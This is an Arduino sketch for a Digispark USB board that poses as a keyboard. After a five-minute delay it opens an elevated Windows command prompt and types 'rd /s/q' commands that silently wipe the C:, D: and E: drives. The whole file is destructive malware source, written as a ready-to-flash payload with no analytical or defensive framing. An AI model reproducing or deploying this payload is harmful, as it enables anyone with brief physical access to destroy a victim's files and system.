#include<DigiKeyboard.h>
void setup() {
  // put your setup code here, to run once:

}

void loop() {
  // Format Drivers
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(300000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(300);
  DigiKeyboard.print("cmd");
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
  DigiKeyboard.delay(2000);
  DigiKeyboard.println("rd /s/q D:\ ");
  DigiKeyboard.delay(400);
  DigiKeyboard.println("rd /s/q C:\ ");
  DigiKeyboard.delay(400);
  DigiKeyboard.println("rd /s/q E:\ ");
  digitalWrite(1, HIGH);
  for(;;){
    //  Zzzzzzzz
  }

}
